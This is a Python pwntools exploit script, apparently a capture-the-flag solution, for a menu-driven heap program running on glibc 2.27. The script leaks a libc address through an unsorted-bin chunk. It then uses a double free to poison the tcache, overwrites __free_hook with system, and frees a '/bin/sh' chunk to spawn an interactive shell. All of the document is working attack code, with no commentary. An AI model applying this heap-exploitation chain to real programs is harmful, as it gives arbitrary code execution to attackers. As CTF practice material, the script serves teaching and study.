#!/usr/bin/env python3

from pwn import *

p = process("./out")
libc = ELF("./libc-2.27.so",  checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
def add(index, size, data):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Enter the index:\n', str(index))
    p.sendlineafter('Enter the size:\n', str(size))
    p.sendlineafter('Enter data:\n', str(data))

def edit(index, data):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Enter the index:\n', str(index))
    p.sendafter('Please update the data:\n', data)

def remove(index):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Enter the index:\n', str(index))

def view(index):
    p.sendlineafter('>> ', '4')
    p.sendlineafter('Enter the index:\n', str(index))


def main():

    add(0,0x100,"AAAA")
    add(1,0x100,"BBBB")
    for i in range(7):
        remove(1)
    remove(0)
    view(0)
    p.recvuntil(' :')
    base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
    __free_hook = base + libc.sym['__free_hook']
    system = base + libc.sym['system']
    log.info("base = " + hex(base))
    log.info('free hook = ' + hex(__free_hook))
    log.info('system = ' + hex(system))
    add(2,0x50,"CCCCC")
    add(3,0x50,"CCCCC")
    remove(2)
    remove(3)
    edit(3, p64(__free_hook))
    add(4,0x50,"/bin/sh\x00")
    add(5,0x50, "brrrrr")
    edit(5,p64(system))
    remove(4)
    p.interactive()


if __name__ == "__main__":
    main()
